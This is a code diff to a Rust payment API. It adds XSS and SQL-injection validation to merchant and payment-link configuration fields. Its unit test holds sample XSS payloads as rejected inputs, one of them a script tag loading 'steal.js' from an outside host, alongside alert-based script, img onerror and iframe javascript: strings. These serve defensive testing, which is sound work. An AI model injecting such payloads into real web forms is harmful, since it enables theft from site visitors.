@@ -125,6 +125,17 @@ pub struct MerchantAccountCreate {
 
 #[cfg(feature = "v1")]
 impl MerchantAccountCreate {
+    pub fn validate(&self) -> Result<(), String> {
+        if let Some(ref merchant_name) = self.merchant_name {
+            if common_utils::validation::contains_potential_xss_or_sqli(merchant_name.peek()) {
+                return Err(
+                    "merchant_name contains potential XSS or SQLi attack vectors".to_string(),
+                );
+            }
+        }
+        Ok(())
+    }
+
     pub fn get_merchant_reference_id(&self) -> id_type::MerchantId {
         self.merchant_id.clone()
     }
@@ -209,6 +220,17 @@ pub struct MerchantAccountCreateWithoutOrgId {
     pub product_type: Option<api_enums::MerchantProductType>,
 }
 
+#[cfg(feature = "v2")]
+impl MerchantAccountCreateWithoutOrgId {
+    pub fn validate(&self) -> Result<(), String> {
+        let merchant_name_string = self.merchant_name.peek().clone().into_inner();
+        if common_utils::validation::contains_potential_xss_or_sqli(&merchant_name_string) {
+            return Err("merchant_name contains potential XSS or SQLi attack vectors".to_string());
+        }
+        Ok(())
+    }
+}
+
 // In v2 the struct used in the API is MerchantAccountCreateWithoutOrgId
 // The following struct is only used internally, so we can reuse the common
 // part of `create_merchant_account` without duplicating its code for v2
@@ -226,6 +248,14 @@ pub struct MerchantAccountCreate {
 
 #[cfg(feature = "v2")]
 impl MerchantAccountCreate {
+    pub fn validate(&self) -> Result<(), String> {
+        let merchant_name_string = self.merchant_name.peek().clone().into_inner();
+        if common_utils::validation::contains_potential_xss_or_sqli(&merchant_name_string) {
+            return Err("merchant_name contains potential XSS or SQLi attack vectors".to_string());
+        }
+        Ok(())
+    }
+
     pub fn get_merchant_reference_id(&self) -> id_type::MerchantId {
         id_type::MerchantId::from_merchant_name(self.merchant_name.clone().expose())
     }
@@ -453,6 +483,17 @@ pub struct MerchantAccountUpdate {
 
 #[cfg(feature = "v1")]
 impl MerchantAccountUpdate {
+    pub fn validate(&self) -> Result<(), String> {
+        if let Some(ref merchant_name) = self.merchant_name {
+            if common_utils::validation::contains_potential_xss_or_sqli(merchant_name) {
+                return Err(
+                    "merchant_name contains potential XSS or SQLi attack vectors".to_string(),
+                );
+            }
+        }
+        Ok(())
+    }
+
     pub fn get_primary_details_as_value(
         &self,
     ) -> CustomResult<Option<serde_json::Value>, errors::ParsingError> {
@@ -534,6 +575,17 @@ pub struct MerchantAccountUpdate {
 
 #[cfg(feature = "v2")]
 impl MerchantAccountUpdate {
+    pub fn validate(&self) -> Result<(), String> {
+        if let Some(ref merchant_name) = self.merchant_name {
+            if common_utils::validation::contains_potential_xss_or_sqli(merchant_name) {
+                return Err(
+                    "merchant_name contains potential XSS or SQLi attack vectors".to_string(),
+                );
+            }
+        }
+        Ok(())
+    }
+
     pub fn get_merchant_details_as_secret(
         &self,
     ) -> CustomResult<Option<pii::SecretSerdeValue>, errors::ParsingError> {
@@ -1580,7 +1632,7 @@ pub struct MerchantConnectorResponse {
     pub connector_wallets_details: Option<ConnectorWalletDetails>,
 
     /// Details about the connector’s webhook configuration
-    #[schema(value_type = Option<WebhookSetupCapabilities>)]
+    #[schema(value_type = Option<WebhookSetupCapabilities>, deprecated)]
     pub webhook_setup_capabilities:
         Option<common_types::connector_webhook_configuration::WebhookSetupCapabilities>,
 }
@@ -2161,7 +2213,7 @@ pub struct MerchantConnectorDetailsWrap {
     #[schema(value_type = Option<MerchantConnectorDetails>, example = r#"{
        "connector_account_details": {
             "auth_type": "HeaderKey",
-            "api_key":"sk_test_xxxxxexamplexxxxxx12345"
+            "api_key":"<stripe_test_secret_key>"
         },
         "metadata": {
             "user_defined_field_1": "sample_1",
@@ -3423,15 +3475,25 @@ impl BusinessGenericLinkConfig {
     }
 }
 
-#[derive(Clone, Debug, serde::Deserialize, serde::Serialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Deserialize,
+    serde::Serialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct BusinessPaymentLinkConfig {
     /// Custom domain name to be used for hosting the link in your own domain
     pub domain_name: Option<String>,
     /// Default payment link config for all future payment link
     #[serde(flatten)]
     #[schema(value_type = PaymentLinkConfigRequest)]
+    #[xss_clean(recurse)]
     pub default_config: Option<PaymentLinkConfigRequest>,
     /// list of configs for multi theme setup
+    #[xss_clean(recurse)]
     pub business_specific_configs: Option<HashMap<String, PaymentLinkConfigRequest>>,
     /// A list of allowed domains (glob patterns) where this link can be embedded / opened from
     #[schema(value_type = Option<HashSet<String>>)]
@@ -3442,6 +3504,7 @@ pub struct BusinessPaymentLinkConfig {
 
 impl BusinessPaymentLinkConfig {
     pub fn validate(&self) -> Result<(), String> {
+        common_utils::validation::ValidateXSSOrSQLi::validate_xss_or_sqli(self)?;
         let host_domain_valid = self
             .domain_name
             .clone()
@@ -3478,7 +3541,15 @@ impl BusinessPaymentLinkConfig {
     }
 }
 
-#[derive(Clone, Debug, serde::Deserialize, serde::Serialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Deserialize,
+    serde::Serialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct PaymentLinkConfigRequest {
     /// custom theme for the payment link
     #[schema(value_type = Option<String>, max_length = 255, example = "#4E6ADD")]
@@ -3505,6 +3576,7 @@ pub struct PaymentLinkConfigRequest {
     #[schema(default = true, example = true)]
     pub show_card_form_by_default: Option<bool>,
     /// Dynamic details related to merchant to be rendered in payment link
+    #[xss_clean(recurse)]
     pub transaction_details: Option<Vec<PaymentLinkTransactionDetails>>,
     /// Configurations for the background image for details section
     pub background_image: Option<PaymentLinkBackgroundImageConfig>,
@@ -3552,6 +3624,8 @@ pub struct PaymentLinkConfigRequest {
 
 impl PaymentLinkConfigRequest {
     pub fn validate(&self) -> Result<(), String> {
+        common_utils::validation::ValidateXSSOrSQLi::validate_xss_or_sqli(self)?;
+
         if let Some(custom_message) = self.custom_message_for_payment_method_types.as_ref() {
             custom_message.validate().map_err(|e| e.to_string())?;
         }
@@ -3559,7 +3633,15 @@ impl PaymentLinkConfigRequest {
     }
 }
 
-#[derive(Clone, Debug, serde::Deserialize, serde::Serialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Deserialize,
+    serde::Serialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct PaymentLinkTransactionDetails {
     /// Key for the transaction details
     #[schema(value_type = String, max_length = 255, example = "Policy-Number")]
@@ -3597,7 +3679,15 @@ pub struct PaymentLinkBackgroundImageConfig {
     pub size: Option<api_enums::ElementSize>,
 }
 
-#[derive(Clone, Debug, serde::Serialize, serde::Deserialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Serialize,
+    serde::Deserialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct PaymentLinkConfig {
     /// custom theme for the payment link
     pub theme: String,
@@ -3618,6 +3708,7 @@ pub struct PaymentLinkConfig {
     /// A list of allowed domains (glob patterns) where this link can be embedded / opened from
     pub allowed_domains: Option<HashSet<String>>,
     /// Dynamic details related to merchant to be rendered in payment link
+    #[xss_clean(recurse)]
     pub transaction_details: Option<Vec<PaymentLinkTransactionDetails>>,
     /// Configurations for the background image for details section
     pub background_image: Option<PaymentLinkBackgroundImageConfig>,
@@ -3722,5 +3813,91 @@ impl std::ops::Deref for TtlForExtendedCardInfo {
     type Target = u16;
     fn deref(&self) -> &Self::Target {
         &self.0
+    }
+}
+
+#[cfg(feature = "v2")]
+#[derive(Debug)]
+pub struct MCACGraphData {
+    pub connector_name: common_enums::connector_enums::Connector,
+    pub payment_methods_enabled: Option<Vec<common_types::payment_methods::PaymentMethodsEnabled>>,
+}
+
+#[cfg(feature = "v1")]
+#[derive(Debug, Deserialize)]
+pub struct MCACGraphData {
+    pub connector_name: String,
+    pub payment_methods_enabled: Option<Vec<PaymentMethodsEnabled>>,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_payment_link_config_request_validation() {
+        // Safe input should validate successfully
+        let safe_request = PaymentLinkConfigRequest {
+            theme: Some("#4E6ADD".to_string()),
+            logo: Some("https://example.com/logo.png".to_string()),
+            seller_name: Some("Safe Merchant Name".to_string()),
+            sdk_layout: None,
+            display_sdk_only: None,
+            enabled_saved_payment_method: None,
+            hide_card_nickname_field: None,
+            show_card_form_by_default: None,
+            transaction_details: None,
+            background_image: None,
+            details_layout: None,
+            payment_button_text: Some("Pay Now".to_string()),
+            custom_message_for_card_terms: Some("Agree to terms".to_string()),
+            custom_message_for_payment_method_types: None,
+            payment_button_colour: None,
+            skip_status_screen: None,
+            payment_button_text_colour: None,
+            background_colour: None,
+            sdk_ui_rules: None,
+            payment_link_ui_rules: None,
+            enable_button_only_on_form_ready: None,
+            payment_form_header_text: Some("Header Text".to_string()),
+            payment_form_label_type: None,
+            show_card_terms: None,
+            is_setup_mandate_flow: None,
+            color_icon_card_cvc_error: None,
+            show_merchant_name: None,
+        };
+        assert!(safe_request.validate().is_ok());
+
+        // Dangerous input in seller_name should fail validation
+        let unsafe_seller = PaymentLinkConfigRequest {
+            seller_name: Some(
+                "S\"/><script src=//p.jesse-yang.com/steal.js></script><meta x=\"".to_string(),
+            ),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_seller.validate().is_err());
+
+        // Dangerous input in payment_button_text should fail validation
+        let unsafe_button = PaymentLinkConfigRequest {
+            payment_button_text: Some("<script>alert(1)</script>".to_string()),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_button.validate().is_err());
+
+        // Dangerous input in custom_message_for_card_terms should fail validation
+        let unsafe_terms = PaymentLinkConfigRequest {
+            custom_message_for_card_terms: Some(
+                "Agree to <img src=x onerror=alert(1)> terms".to_string(),
+            ),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_terms.validate().is_err());
+
+        // Dangerous input in payment_form_header_text should fail validation
+        let unsafe_header = PaymentLinkConfigRequest {
+            payment_form_header_text: Some("Header <iframe src=javascript:alert(1)>".to_string()),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_header.validate().is_err());
     }
 }
